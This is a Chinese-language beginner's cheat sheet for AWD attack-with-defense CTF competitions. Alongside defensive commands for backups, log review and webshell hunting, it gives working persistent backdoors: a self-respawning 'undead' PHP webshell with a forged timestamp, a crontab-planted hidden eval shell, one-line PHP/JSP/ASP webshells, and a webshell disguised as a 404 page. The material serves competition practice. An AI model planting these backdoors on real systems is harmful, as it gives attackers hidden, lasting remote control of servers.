# AWD比赛入门攻略总结

> 原文: https://www.ctfiot.com/30384.html
> ID: 30384


```
ifconfig #Linux
ipconfig #Windows
```



```
namp -sn 192.168.0.0/24 #扫描C段主机存活
httpscan.py 192.168.0.0/24 –t 10 #扫描C段主机存活
```



```
nmap -sV 192.168.0.2 #扫描主机系统版本
nmap -sS 192.168.0.2 #扫描主机常用端口
nmap -sS -p 80,445 192.168.0.2 #扫描主机部分端口
nmap -sS -p- 192.168.0.2 #扫描主机全部端口
```



```
find / -name "nginx.conf" #定位nginx目录
find / -path "*nginx*" -name nginx*conf #定位nginx配置目录
find / -name "httpd.conf" #定位apache目录
find / -path "*apache*" -name apache*conf #定位apache配置目录
```



```
find / -name "index.php" #定位网站目录
```



```
/var/log/nginx/ #默认Nginx日志目录
/var/log/apache/ #默认Apache日志目录
/var/log/apache2/ #默认Apache日志目录
/usr/local/tomcat/logs #Tomcat日志目录
tail -f xxx.log #实时刷新滚动日志文件
```



```
header(php'flag:'.file_get_contents('/tmp/flag'));
```



```
<?php 
ignore_user_abort(true); #客户机断开依旧执行
set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
unlink(__FILE__); 删除文件本身，以起到隐蔽自身的作用。
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
 file_put_contents($file,$code);
 system('touch -m -d "2018-12-01 09:10:12" .2.php');
 usleep(5000);
} 
?>
```



```
system('echo "* * * * * echo \"<?php if(md5(\\\\\\\\\$_POST[pass])==\'7b7fdffef464019f7190d0384d5b3838\'){@eval(\\\\\\\\\$_POST[1]);} \" > /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami');
```



```
tar -cvf web.tar /var/www/html
zip -q -r web.zip /var/www/html
```



```
tar -xvf web.tar -c /var/www/html
unzip web.zip -d /var/www/html
```



```
mv web.tar /tmp
mv web.zip /home/xxx
```



```
scp username@servername:/path/filename /tmp/local_destination #从服务器下载单个文件到本地
scp /path/local_filename username@servername:/path #从本地上传单个文件到服务器
scp -r username@servername:remote_dir/ /tmp/local_dir #从服务器下载整个目录到本地
scp -r /tmp/local_dir username@servername:remote_dir #从本地上传整个目录到服务器
```



```
Xshell、SecureCRT、finalshell
```



```
FileZilla 、WinSCP、SmartFTP
```



```
mysqldump –u username –p password databasename > bak.sql
```



```
mysqldump –all -databases > bak.sql
```



```
mysql –u username –p password database < bak.sql
```



```
netstat -ano/-a #查看端口情况
uname -a #系统信息
ps -aux、ps -ef #进程信息
cat /etc/passwd #用户情况
ls /home/ #用户情况
id #用于显示用户ID，以及所属群组ID
find / -type d -perm -002 #可写目录检查
grep -r “flag” /var/www/html/ #查找默认FLAG
```



```
passwd username #ssh口令修改
set password for mycms@localhost = password('123'); #MySQL密码修改
find /var/www//html -path '*config*’ #查找配置文件中的密码凭证
```



```
find /var/www/html/ -name "*.tar"
find /var/www/html/ -name "*.zip"
```



```
find /var/www/html -name *.php -mmin -20 #查看最近20分钟修改文件
find ./ -name '*.php' | xargs wc -l | sort -u #寻找行数最短文件
grep -r --include=*.php '[^a-z]eval($_POST' /var/www/html #查包含关键字的php文件
find /var/www/html -type f -name "*.php" | xargs grep "eval(" |more
```



```
# phpwebshell
<?php @eval($_GET['cmd']); ?>

<?php @eval($_POST['cmd']); ?>

<?php @eval($_REQUESTS['cmd']); ?>
```



```
# jspwebshell

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```



```
# aspwebshell

<%eval request ("cmd")%> 或 <% execute(request("cmd")) %>
```



```
<?php

system("kill -9 pid;rm -rf .shell.php"); #pid和不死马名称根据实际情况定

?>
```



```
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">

<html><head>

<title>404 Not Found</title>

</head><body>

<h1>Not Found</h1>

<p>The requested URL was not found on this server.</p>

</body></html>

<?php @preg_replace("/[pageerror]/e",$_POST['error'],"saft"); header('HTTP/1.1 404 Not Found');

?>
```



```
ps -aux #查看进程
kill -9 pid #强制进程查杀
```



```
netstat -anp #查看端口
firewall-cmd --zone= public --remove-port=80/tcp –permanent #关闭端口
firewall-cmd –reload #重载防火墙
```



```
DiscuzX2 \config\config_global.php

Wordpress \wp-config.php

Metinfo \include\head.php

PHPCMS V9 \phpcms\base.php

PHPWIND8.7 \data\sql_config.php

DEDECMS5.7 \data\common.inc.php
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709de0cafbb.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709df2bcd5c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709e0279e48.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709e1c417fb.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709e3200479.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709e4555f6c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709e57a2639.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/img_63709e88a5508.png)